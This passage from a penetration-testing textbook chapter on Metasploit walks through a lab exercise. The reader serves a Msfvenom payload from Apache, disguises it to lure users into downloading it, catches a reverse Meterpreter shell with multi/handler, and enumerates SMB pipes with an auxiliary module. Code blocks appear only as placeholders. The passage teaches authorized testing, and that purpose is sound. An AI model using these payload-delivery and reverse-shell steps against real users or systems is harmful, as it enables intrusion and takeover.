  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: One good way to serve up payloads is to host them on a web server, disguise
    them as something useful, and lure users into downloading them. For this example,
    we’ll host our Metasploit executable on our Kali machine’s builtin Apache server
    and browse to the file from our target machine.
  prefs: []
  type: TYPE_NORMAL
- en: First, run **`cp chapter4example.exe /var/www`** to copy the payload executable
    to the Apache directory, and then make sure the web server is started with **`service
    apache2 start`**.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE26]'
  prefs: []
  type: TYPE_PRE
- en: Now switch to your Windows XP target and open Internet Explorer. Browse to *[http://192.168.20.9/chapter4example.exe](http://192.168.20.9/chapter4example.exe)*
    and download the file. But before we run the file, we have one loose end to deal
    with.
  prefs: []
  type: TYPE_NORMAL
- en: So far when attempting to exploit our target machine, Metasploit set up our
    payload handlers and sent the exploit. When we used Msfconsole to exploit the
    MS08-067 vulnerability with a reverse shell payload, Metasploit first set up a
    handler listening on port 4444 for the reverse connection, but up to this point
    we have nothing listening for a reverse connection from the payload we created
    with Msfvenom.
  prefs: []
  type: TYPE_NORMAL
- en: Using the Multi/Handler Module
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Start Msfconsole again, and we’ll look at a Metasploit module called *multi/handler*.
    This module allows us to set up standalone handlers, which is just what we’re
    lacking. We need a handler to catch our Meterpreter connection when our malicious
    executable is run from the Windows XP target. Select the *multi/handler* module
    with **`use multi/handler`**.
  prefs: []
  type: TYPE_NORMAL
- en: The first thing to do is tell *multi/handler* which of Metasploit’s many handlers
    we need. We need to catch the `windows/meterpreter/reverse_tcp` payload we used
    when we created our executable with Msfvenom. Choose it with **`set PAYLOAD windows/meterpreter/reverse_tcp`**,
    and follow it with **`show options`** ([Example 4-16](ch04.xhtml#options_with_multisolidushandler
    "Example 4-16. Options with multi/handler")).
  prefs: []
  type: TYPE_NORMAL
- en: Example 4-16. Options with multi/handler
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE27]'
  prefs: []
  type: TYPE_PRE
- en: From here we tell Metasploit which setup we used when we created the payload.
    We’ll set the `LHOST` option to our local Kali IP address and the `LPORT` to the
    port we chose in Msfvenom, in this case 192.168.20.9 and 12345, respectively.
    Once all the options for the payload are set correctly, enter **`exploit`**, as
    shown in [Example 4-17](ch04.xhtml#setting_up_a_handler "Example 4-17. Setting
    up a handler").
  prefs: []
  type: TYPE_NORMAL
- en: Example 4-17. Setting up a handler
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE28]'
  prefs: []
  type: TYPE_PRE
- en: As you can see, Metasploit sets up a reverse handler on port 12345 as instructed,
    listening for a payload to call back.
  prefs: []
  type: TYPE_NORMAL
- en: Now we can switch back to our Windows XP target and run our downloaded executable.
    Run *chapter4example.exe* on your Windows target. Back in Msfconsole, you should
    see that the handler receives the reverse connection, and you receive a Meterpreter
    session.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE29]'
  prefs: []
  type: TYPE_PRE
- en: Spend some time experimenting with Msfvenom if you like. We’ll return to this
    useful tool when we attempt to bypass antivirus solutions in [Chapter 12](ch12.xhtml
    "Chapter 12. Bypassing Antivirus Applications").
  prefs: []
  type: TYPE_NORMAL
- en: Using an Auxiliary Module
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Metasploit was first conceived as an exploitation framework, and it continues
    to be a top contender in the world of exploitation. But in the ensuing years,
    its functionality has grown in about as many directions as there are creative
    minds working on it. I sometimes quip that Metasploit can do everything except
    my laundry, and I’m currently working on a module for that.
  prefs: []
  type: TYPE_NORMAL
- en: Dirty socks aside, in addition to exploitation, Metasploit has modules to aid
    in every phase of pentesting. Some modules that are not used for exploitation
    are known as *auxiliary modules*; they include things like vulnerability scanners,
    fuzzers, and even denial of service modules. (A good rule of thumb to remember
    is that exploit modules use a payload and auxiliary modules do not.)
  prefs: []
  type: TYPE_NORMAL
- en: For example, when we first used the *windows/smb/ms08_067_netapi* exploit module
    earlier in this chapter, one of its options was `SMBPIPE`. The default value for
    that option was `BROWSER`. Let’s look at an auxiliary module that will enumerate
    the listening pipes on an SMB server, *auxiliary/scanner/smb/pipe_auditor* ([Example 4-18](ch04.xhtml#options_for_scannersolidussmbsoliduspipe
    "Example 4-18. Options for scanner/smb/pipe_auditor")). (We use auxiliary modules
    like exploits, and like exploits we can also drop the *auxiliary/* part of the
    module name.)
  prefs: []
  type: TYPE_NORMAL
- en: Example 4-18. Options for scanner/smb/pipe_auditor
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE30]'
  prefs: []
  type: TYPE_PRE
- en: The options for this module are a bit different from what we’ve seen so far.
    Instead of `RHOST` we have `RHOSTS` ❶, which allows us to specify more than one
    remote host to run the module against. (Auxiliaries can be run against multiple
    hosts, whereas exploits can exploit only one system at a time.)
  prefs: []
  type: TYPE_NORMAL
- en: We also see options for `SMBUser`, `SMBPass`, and `SMBDomain`. Because our Windows
    XP target is not part of any domain, we can leave the `SMBDomain` at the default
    value, `WORKGROUP`. We can leave the `SMBUser` and `SMBPass` values blank. The
    `THREADS` option allows us to control the speed of Metasploit by having our module
    run in multiple threads. We’re scanning only one system in this case, so the default
    value of `1` thread will work fine. The only option we need to set is `RHOSTS`
    to the IP address of our Windows XP target.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE31]'
  prefs: []
  type: TYPE_PRE
- en: Even though we aren’t technically exploiting anything in this case, we can still
    tell Metasploit to run our auxiliary module by entering **`exploit`**.
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE32]'
  prefs: []
  type: TYPE_PRE
- en: The module audits the listening SMB pipes on our Windows XP target. As it turns
    out, the browser pipe is the only available pipe ❶. Because this pipe is listening,
    this is the correct value for the `SMBPIPE` option in the *windows/smb/ms08_067_netapi*
    exploit module we used earlier in the chapter.
  prefs: []
  type: TYPE_NORMAL
- en: Updating Metasploit
  prefs: []
  type: TYPE_NORMAL
- en: The exercises in this book are designed to work on a base install of Kali Linux
    1.0.6\. Naturally, many security tools used in this book will have been updated
    since Kali’s release. Metasploit in particular receives regular updates from core
    developers as well as from the security community.
  prefs: []
  type: TYPE_NORMAL
- en: 'All of the material in this book works with the Metasploit version installed
    on Kali 1.0.6\. As you continue your career as a pentester, you’ll want the latest
    Metasploit modules. The Metasploit Project is typically pretty solid at releasing
    modules for the latest security issues circulating the Web. To pull down the latest
    modules from Metasploit’s GitHub, enter the following: root@kali:~# msfupdate'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE33]'
  prefs: []
  type: TYPE_PRE
- en: Summary
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: In this chapter we’ve gotten comfortable using some of Metasploit’s interfaces.
    We’ll return to Metasploit throughout the book.
  prefs: []
  type: TYPE_NORMAL
- en: In the next few chapters we’ll simulate a penetration test against our target
    machines, covering a wide variety of vulnerability types. If you pursue a career
    in penetration testing, you will likely encounter clients spanning the gamut of
    possible security postures. Some will be missing so many patches across the organization
    that you may wonder if they have updated since installing the base image back
    in 2001\. Along with missing patches, you may find additional vulnerabilities
    such as default passwords and misconfigured services. Gaining access to such networks
    is trivial for skilled penetration testers.
  prefs: []
  type: TYPE_NORMAL
- en: On the other hand, you may also find yourself working for clients who have patch
    management down pat, with everything from Windows operating systems to all third-party
    software on a regular patch cycle across the organization. Some clients may deploy
    cutting-edge security controls such as proxies that allow only Internet Explorer
    to call out to the Internet. This will stop even Metasploit reverse shells that
    call back on ports 80 or 443 and look like web traffic, unless you are able to
    exploit the Internet Explorer program, which may also be completely patched. You
    may find intrusion prevention firewalls at the perimeter that drop any string
    that looks even a little bit like attack traffic.
  prefs: []
  type: TYPE_NORMAL
- en: 'Simply throwing the MS08-067 Metasploit module at these high-security networks
    will get you no results, except maybe a call from a network monitoring vendor
    with a warrant for your arrest. (Don’t worry: As part of the penetration test,
    you will have a get-out-of-jail-free card.) But even highly secure networks are
    only as strong as their weakest link. For instance, I once performed an onsite
    penetration test for a company that employed all of the security controls I just
    mentioned. However, the local administrator password on all the Windows workstations
    was the same five-letter dictionary word. After I cracked the password, I was
    able to log on as an administrator on every workstation on the network. From there
    I was able to use something called *token impersonation* to gain domain administrator
    access. Despite all the strong security controls, with a little effort I was able
    to take over the network the same way I would a network with missing patches from
    2003.'
  prefs: []
  type: TYPE_NORMAL
- en: As you work through the rest of this book, you will pick up not only the technical
    skills required to break into vulnerable systems but also the mindset required
    to find a way in when none seems readily apparent.
  prefs: []
  type: TYPE_NORMAL
- en: Now let’s turn our attention to gathering information about our targets so we
    can develop a solid plan of attack.
  prefs: []
  type: TYPE_NORMAL
